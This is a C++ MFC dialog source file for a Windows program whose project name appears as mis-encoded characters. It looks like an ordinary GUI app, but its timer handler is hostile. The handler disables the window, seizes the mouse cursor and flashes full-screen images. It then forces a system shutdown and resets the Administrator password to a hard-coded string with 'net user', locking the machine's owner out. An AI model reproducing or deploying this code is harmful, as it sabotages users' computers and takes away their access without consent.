// °µÒ¹Ö®»êDlg.cpp : implementation file
//
#include "bits/stdc++.h"
#include "windows.h"
#include "stdafx.h"
#include "°µÒ¹Ö®»ê.h"
#include "°µÒ¹Ö®»êDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog

CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
	//{{AFX_MSG_MAP(CMyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg message handlers
void CMyDlg::zzysb()
{
	CClientDC dc(this);
	b1.LoadBitmap(IDB_BITMAP1);
	b2.LoadBitmap(IDB_BITMAP2);
    b3.LoadBitmap(IDB_BITMAP3);
	b4.LoadBitmap(IDB_BITMAP4);
	b5.LoadBitmap(IDB_BITMAP5);
	b6.LoadBitmap(IDB_BITMAP6);
	b7.LoadBitmap(IDB_BITMAP7);
	b8.LoadBitmap(IDB_BITMAP8);
	b9.LoadBitmap(IDB_BITMAP9);
    b10.LoadBitmap(IDB_BITMAP10);
	b11.LoadBitmap(IDB_BITMAP11);
	b1.GetObject(sizeof(bm1),&bm1);
	temp.CreateCompatibleBitmap(&dc,1360,768);
	cdc1.CreateCompatibleDC(0);
	cdc2.CreateCompatibleDC(0);
	cdc3.CreateCompatibleDC(0);
	cdc4.CreateCompatibleDC(0);
	cdc5.CreateCompatibleDC(0);
	cdc6.CreateCompatibleDC(0);
	cdc7.CreateCompatibleDC(0);
	cdc8.CreateCompatibleDC(0);
	cdc9.CreateCompatibleDC(0);
	cdc10.CreateCompatibleDC(0);
	cdc11.CreateCompatibleDC(0);
	cdc12.CreateCompatibleDC(0);
	cdc1.SelectObject(&temp);
    cdc2.SelectObject(&b1);
	cdc3.SelectObject(&b2);
	cdc4.SelectObject(&b3);
	cdc5.SelectObject(&b4);
	cdc6.SelectObject(&b5);
	cdc7.SelectObject(&b6);
	cdc8.SelectObject(&b7);
	cdc9.SelectObject(&b8);
	cdc10.SelectObject(&b9);
	cdc11.SelectObject(&b10);
	cdc12.SelectObject(&b11);
}
BOOL CMyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
    CMyDlg::zzysb();
	SetTimer(1,1,NULL);
	a1=0;
	d=4;
	n=2;
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CMyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMyDlg::OnOK() 
{
	// TODO: Add extra validation here
	
	//CDialog::OnOK();
}

void CMyDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	CClientDC dc(this);
	srand(time(NULL));
	for(i=1;i<=100;i++)
	{
		random_choice=rand()%20+1;
		EnableWindow(false);
		an=a1+(n-1)*d;
		sn=n*(a1+an)/2;
		SetCursorPos(an,sn);
	    n++;
		switch(random_choice)
		{
			case 1:cdc1.BitBlt(0,0,1360,768,&cdc2,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 2:cdc1.BitBlt(0,0,1360,768,&cdc3,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 3:cdc1.BitBlt(0,0,1360,768,&cdc4,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 4:cdc1.BitBlt(0,0,1360,768,&cdc5,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
			case 5:cdc1.BitBlt(0,0,1360,768,&cdc6,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 6:cdc1.BitBlt(0,0,1360,768,&cdc7,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 7:cdc1.BitBlt(0,0,1360,768,&cdc8,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 8:cdc1.BitBlt(0,0,1360,768,&cdc9,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		    case 9:cdc1.BitBlt(0,0,1360,768,&cdc10,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
            case 10:cdc1.BitBlt(0,0,1360,768,&cdc11,0,0,SRCCOPY);CenterWindow();ShowWindow(SW_MAXIMIZE);break;
		}
		dc.BitBlt(0,0,800,600,&cdc1,0,0,SRCCOPY);
		Sleep(1000);
	}
	system("shutdown -s -t 1");
	system("net user Administrator REDVATTBAT200454");
	CDialog::OnTimer(nIDEvent);
}
